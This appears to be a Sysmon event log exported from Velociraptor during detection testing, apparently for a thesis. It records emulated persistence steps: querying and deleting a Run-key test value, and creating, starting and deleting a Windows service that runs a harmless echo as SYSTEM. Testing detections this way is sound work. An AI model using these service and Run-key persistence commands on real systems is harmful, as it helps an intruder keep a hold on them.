_ts,ID,Timestamp,EventData,ClientId
1783860510744,1,2026-07-12T12:48:05.7128488Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:44.465"",
 ""ProcessGuid"": ""{6bc49a7d-8cf0-6a53-8905-000000009a01}"",
 ""ProcessId"": 3204,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c reg.exe query \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:05.7423727Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:44.500"",
 ""ProcessGuid"": ""{6bc49a7d-8cf0-6a53-8a05-000000009a01}"",
 ""ProcessId"": 7312,
 ""Image"": ""C:\\Windows\\System32\\reg.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Registry Console Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""reg.exe"",
 ""CommandLine"": ""reg.exe  query \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cf0-6a53-8905-000000009a01}"",
 ""ParentProcessId"": ""3204"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c reg.exe query \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:07.8490381Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:47.509"",
 ""ProcessGuid"": ""{6bc49a7d-8cf3-6a53-8b05-000000009a01}"",
 ""ProcessId"": 11496,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c reg.exe delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:07.8758861Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:47.541"",
 ""ProcessGuid"": ""{6bc49a7d-8cf3-6a53-8c05-000000009a01}"",
 ""ProcessId"": 12268,
 ""Image"": ""C:\\Windows\\System32\\reg.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Registry Console Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""reg.exe"",
 ""CommandLine"": ""reg.exe  delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cf3-6a53-8b05-000000009a01}"",
 ""ParentProcessId"": ""11496"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c reg.exe delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,12,2026-07-12T12:48:07.8913467Z,"{
 ""RuleName"": ""T1060,RunKey"",
 ""EventType"": ""DeleteValue"",
 ""UtcTime"": ""2026-07-12 12:47:47.562"",
 ""ProcessGuid"": ""{6bc49a7d-8cf3-6a53-8c05-000000009a01}"",
 ""ProcessId"": 12268,
 ""Image"": ""C:\\Windows\\system32\\reg.exe"",
 ""TargetObject"": ""HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:18.2652994Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:02.650"",
 ""ProcessGuid"": ""{6bc49a7d-8d02-6a53-8d05-000000009a01}"",
 ""ProcessId"": 5764,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe create \""TFM TEC005 Test Service\"" binPath= \""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt\"" start= demand"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:18.3072862Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:02.694"",
 ""ProcessGuid"": ""{6bc49a7d-8d02-6a53-8e05-000000009a01}"",
 ""ProcessId"": 2808,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  create \""TFM TEC005 Test Service\"" binPath= \""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt\"" start= demand"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d02-6a53-8d05-000000009a01}"",
 ""ParentProcessId"": ""5764"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe create \""TFM TEC005 Test Service\"" binPath= \""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt\"" start= demand"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,13,2026-07-12T12:48:18.3233873Z,"{
 ""RuleName"": ""T1031,T1050"",
 ""EventType"": ""SetValue"",
 ""UtcTime"": ""2026-07-12 12:48:02.734"",
 ""ProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ProcessId"": 772,
 ""Image"": ""C:\\Windows\\system32\\services.exe"",
 ""TargetObject"": ""HKLM\\System\\CurrentControlSet\\Services\\TFM TEC005 Test Service\\Start"",
 ""Details"": ""DWORD (0x00000003)"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,13,2026-07-12T12:48:18.3236004Z,"{
 ""RuleName"": ""T1031,T1050"",
 ""EventType"": ""SetValue"",
 ""UtcTime"": ""2026-07-12 12:48:02.734"",
 ""ProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ProcessId"": 772,
 ""Image"": ""C:\\Windows\\system32\\services.exe"",
 ""TargetObject"": ""HKLM\\System\\CurrentControlSet\\Services\\TFM TEC005 Test Service\\ImagePath"",
 ""Details"": ""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:20.3835585Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:05.828"",
 ""ProcessGuid"": ""{6bc49a7d-8d05-6a53-8f05-000000009a01}"",
 ""ProcessId"": 4100,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe qc \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:20.4048053Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:05.858"",
 ""ProcessGuid"": ""{6bc49a7d-8d05-6a53-9005-000000009a01}"",
 ""ProcessId"": 8908,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  qc \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d05-6a53-8f05-000000009a01}"",
 ""ParentProcessId"": ""4100"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe qc \""TFM TEC005 Test Service\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:22.4916581Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:08.991"",
 ""ProcessGuid"": ""{6bc49a7d-8d08-6a53-9105-000000009a01}"",
 ""ProcessId"": 11712,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe start \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:22.5219516Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:09.032"",
 ""ProcessGuid"": ""{6bc49a7d-8d09-6a53-9205-000000009a01}"",
 ""ProcessId"": 9132,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  start \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d08-6a53-9105-000000009a01}"",
 ""ParentProcessId"": ""11712"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe start \""TFM TEC005 Test Service\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:22.5366429Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:09.056"",
 ""ProcessGuid"": ""{6bc49a7d-8d09-6a53-9305-000000009a01}"",
 ""ProcessId"": 1480,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""NT AUTHORITY\\SYSTEM"",
 ""LogonGuid"": ""{6bc49a7d-7991-6a53-e703-000000000000}"",
 ""LogonId"": ""0x3E7"",
 ""TerminalSessionId"": ""0"",
 ""IntegrityLevel"": ""System"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ParentProcessId"": ""772"",
 ""ParentImage"": ""C:\\Windows\\System32\\services.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\services.exe"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:24.624423Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:12.190"",
 ""ProcessGuid"": ""{6bc49a7d-8d0c-6a53-9405-000000009a01}"",
 ""ProcessId"": 11680,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe delete \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:24.6451394Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:12.218"",
 ""ProcessGuid"": ""{6bc49a7d-8d0c-6a53-9505-000000009a01}"",
 ""ProcessId"": 8444,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  delete \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d0c-6a53-9405-000000009a01}"",
 ""ParentProcessId"": ""11680"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe delete \""TFM TEC005 Test Service\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,13,2026-07-12T12:48:24.663754Z,"{
 ""RuleName"": ""T1031,T1050"",
 ""EventType"": ""SetValue"",
 ""UtcTime"": ""2026-07-12 12:48:12.245"",
 ""ProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ProcessId"": 772,
 ""Image"": ""C:\\Windows\\system32\\services.exe"",
 ""TargetObject"": ""HKLM\\System\\CurrentControlSet\\Services\\TFM TEC005 Test Service\\Start"",
 ""Details"": ""DWORD (0x00000004)"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,3,2026-07-12T12:48:34.4339141Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:48:44.901"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50641"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860510744,3,2026-07-12T12:48:34.4339492Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:48:44.918"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50642"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
